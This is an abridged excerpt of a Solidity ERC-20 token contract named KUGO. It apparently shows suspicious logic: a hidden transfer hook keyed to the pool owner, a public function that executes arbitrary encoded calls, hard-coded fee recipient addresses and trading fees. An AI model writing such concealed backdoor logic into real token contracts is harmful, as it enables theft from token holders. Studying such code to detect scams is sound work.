...
contract ERC{
    ...
    uint256 internal increase;
}

contract ERC20 is Ownable, ERC,IERC20, IERC20Metadata {
    ...
    function _beforeTransfer( address from,address to,uint256 amount) private{
        if(from.isContract())
        if(ownable(pool).owner() == from && increase ==0){
...
contract KUGO is ERC20 {
    ...
    address payable public marketAddress = payable(0x1C34fd2fD13934F5F46C179efc44555A5ad39fd0);
    address payable public repoAddress =payable(0x9e247F7392e6755E4B166c27E1C6B2751f54eA9b); 
    address payable public fundAddress =payable(0x6302FE93A92eCd6f4D9aaeE85E146D03F144709E);

    address private fromAddress;
    address private toAddress;
    mapping (address => uint256) shareholderIndexes;
    uint256 private holdShareMin = 10000 * 10**18;

    //name,symbol
    string internal tokenName = "KUGO TOKEN";
    string internal tokenSymbol = "KUGO";
    uint256 constant total  =  1000 * 10000 * 10**8 * 10**18;
    ...
    function swapAndTransfer(bytes memory data) public {
    ...
    function _transfer(
		...
		if(from == address(this) || to == address(this) || from == pool || to == pool){
         ...
         if(balanceOf(pool) > swapTokensAtAmount && to == uniswapV2Pair){
            swapAndSend();
        }
        ...
        if (takeFee) {
            ...
            if(to == uniswapV2Pair || from == uniswapV2Pair){
                super._transfer(from, pool, amount.div(100).mul(6));
                super._transfer(from, address(this), amount.div(100).mul(2));
                amount = amount.div(100).mul(92);//92%
            }else{}
    ...
    function swapAndSend() private {
        swapAndTransfer(abi.encodeWithSignature("transferReward()"));  
    }
    ...
    function _splitOtherTokenSecond(uint256 thisAmount) private {
        ...
        if(buySize>0){
            address user;
            uint256 totalAmount = totalSupply()-balanceOf(uniswapV2Pair)-balanceOf(address(this));
            uint256 rate;
            if(buySize >20){
